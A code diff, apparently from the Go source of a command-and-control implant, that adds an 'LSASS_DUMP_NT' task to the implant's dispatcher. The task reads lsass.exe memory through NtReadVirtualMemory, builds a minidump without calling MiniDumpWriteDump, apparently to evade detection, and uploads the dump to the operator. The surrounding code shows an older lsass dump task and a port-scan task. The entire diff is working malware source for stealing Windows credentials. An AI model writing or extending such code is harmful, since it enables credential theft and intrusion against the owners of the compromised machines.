@@ -846,6 +846,26 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, fmt.Sprintf("lsass dump uploaded (%d bytes)", len(data)), "")
 
+	case "LSASS_DUMP_NT":
+		// NtReadVirtualMemory-based lsass dump; builds MDMP without MiniDumpWriteDump.
+		// Args: optional PID (0 = auto-find lsass.exe)
+		var pid2 uint32
+		if task.Args != "" {
+			if p, err := strconv.ParseUint(strings.TrimSpace(task.Args), 10, 32); err == nil {
+				pid2 = uint32(p)
+			}
+		}
+		data2, err2 := lsassDumpNT(pid2)
+		if err2 != nil {
+			t.sendResult(task.ID, "", err2.Error())
+			return
+		}
+		if err2 = t.uploadFile(task.ID, "lsass_nt.dmp", data2); err2 != nil {
+			t.sendResult(task.ID, "", "upload: "+err2.Error())
+			return
+		}
+		t.sendResult(task.ID, fmt.Sprintf("lsass NT dump uploaded (%d bytes)", len(data2)), "")
+
 	case "PORT_SCAN":
 		// Args: "<target> [ports|method] [timeout_ms]"
 		// Discovery methods: arp, icmp, tcp, auto (default: auto = ARP→ICMP→TCP)
